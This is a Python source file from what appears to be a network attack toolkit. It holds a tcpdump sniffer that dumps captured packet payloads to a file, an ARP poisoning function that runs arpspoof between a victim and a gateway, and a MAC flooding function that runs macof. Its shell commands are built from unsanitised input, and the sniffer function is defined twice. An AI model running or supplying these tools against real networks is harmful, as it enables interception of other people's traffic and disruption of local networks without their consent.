from helpers.utils import output, loop_input
import os
import os
from scapy.layers.inet import Raw, rdpcap


def sniffer(out_lck, timeout, port, interface):

    output(out_lck, "Analizer")
    output(out_lck, "Starting TCPDUMP...\n")

    os.system("timeout " + str(timeout) + " tcpdump -s 0 \"port " + str(port) + "\" -i " + interface + " -w captured.pcap")

    pack = rdpcap('captured.pcap')
    file = open("output/sniffed.jpeg", "wb")

    if len(pack) > 0:
        for packet in pack:
            #if this packet got a payload, then it'll be printed in the sniffed file
            if packet.getlayer(Raw):
                output(out_lck, 'Found Payload:\t')
                l = packet[Raw].load
                output(out_lck, l)
                file.write(l)
        file.close()

    else:
        print("Nothing captured..\nExiting....")
        exit(5)

def arpoisoner(out_lck, interface):

    output(out_lck, "\nArp Poisoner\n")

    victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    gatewayip = loop_input(out_lck, "Please insert target IP: ")

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (interface, "192.168." + victimip, "192.168." + gatewayip))


def macflooder(out_lck, interface):
    #This attack will spam mac tables of the target router, dunno if it works
    output(out_lck, "\nMac Flooding\n")

    gatewayIP = loop_input(out_lck, "Please insert gateway IP (Ex 0.10): ")

    os.system("xterm -e \"macof -i %s -d %s\"" % (interface, "192.168." + gatewayIP))


def sniffer(out_lck, timeout, port, interface, encr):

    output(out_lck, "Analizer")
    output(out_lck, "Starting TCPDUMP...\n")

    os.system("timeout " + str(timeout) + " tcpdump -s 0 \"port " + str(port) + "\" -i " + interface + " -w captured.pcap")

    pack = rdpcap('captured.pcap')
    file = open("sniffed/sniff_" + encr, "wb")

    if len(pack) > 0:
        for packet in pack:
            #if this packet got a payload, then it'll be printed in the sniffed file
            if packet.getlayer(Raw):
                output(out_lck, 'Found Payload:\t')
                l = packet[Raw].load
                output(out_lck, l)
                file.write(l)
        file.close()

    else:
        print("Nothing captured..\nExiting....")